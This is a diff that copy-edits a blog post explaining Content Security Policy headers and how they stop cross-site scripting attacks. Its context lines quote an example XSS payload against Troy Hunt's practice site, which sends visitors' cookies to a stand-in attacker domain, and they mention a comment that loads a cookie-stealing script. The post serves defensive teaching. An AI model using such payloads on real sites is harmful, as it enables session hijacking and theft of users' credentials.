@@ -13,19 +13,19 @@ anything.
 ## What is a Content Security Policy (CSP)
 
 When setting up the infrastructure for my startup, I came across
-[securityheaders.com](https://securityheaders.com) which scans any website and ranks it's security
+[securityheaders.com](https://securityheaders.com) which scans any website and ranks its security
 based on which HTTP headers it returns. There are many changes you should make to your HTTP headers
 to increase your security, some new headers you should add, and some you should remove. One of these
 headers is the Content Security Policy.
 
 
-## What problems does it solve
+## What problems does it solve?
 
 The browser will only load approved content defined in a Content Security Policy header if one is
 present. If not, it will load anything it's told to. This default behaviour is the basis for many
 cyber attacks today, the most common of which is an XSS (Cross Site Scripting) attack.
 
-The basics of an XSS attack is when at attacker will trick the browser into loading untrusted
+The basics of an XSS attack is when an attacker will trick the browser into loading untrusted
 content in order to attack a websites visitors. As an example, take a look at
 [hack-yourself-first.com](http://hack-yourself-first.com) which is a great website set up by [Troy
 Hunt](https://www.troyhunt.com) for everyone to learn how to secure their site by hacking another.
@@ -64,7 +64,7 @@ send along their cookies in the URL, for the attacker to find in their server lo
 http://hack-yourself-first.com/Search?searchTerm=');location.href='http://evilcyberhacker.com?cookies='%2BencodeURIComponent(document.cookie);//'
 ```
 
-The only reason this attack is possible, is because the browser loads and executes the inline script
+The only reason this attack is possible is because the browser loads and executes the inline script
 tag. Another XSS attack could be adding a comment with this as the comment body:
 
 ```html
@@ -72,7 +72,7 @@ tag. Another XSS attack could be adding a comment with this as the comment body:
 ```
 
 Then when a user visits the page, the browser will automatically load and run `stealcookies.js`,
-which doesn't sound plesant.
+which doesn't sound pleasant.
 
 
 ## How will it make my site more secure?
@@ -88,7 +88,7 @@ viewing your site into loading an untrusted script, there are still issues that 
    you'll miss something, leaving your users vulnerable__.
 2. Your users will have all sorts of dodgey browser extensions installed, from free VPN's such as
    Hola to extensions that allow you to stream torrent videos while they download. These extensions
-   has almost unlimited access to the DOM.
+   have almost unlimited access to the DOM.
 
 A properly implemented CSP is essentially a blanket ban on not only XSS attacks, but any attack that
 relies on the browser loading untrusted assets. In order for an attacker to compromise your CSP
@@ -272,7 +272,7 @@ Content-Security-Policy script-src: 'nonce-67eab753ab3f0a713e02b07421dae6b7' ...
 
 ### Step four - webpack and unsafe-eval
 
-It this point I turned my attention to the obscene amount of errors coming through about using
+From this point I turned my attention to the obscene amount of errors coming through about using
 `unsafe-eval`. Our webpack config uses `devtool: eval` in order to speed up development builds. 
 So I allowed unsafe eval in dev but not in production - that would negate the entire 
 point of the CSP.
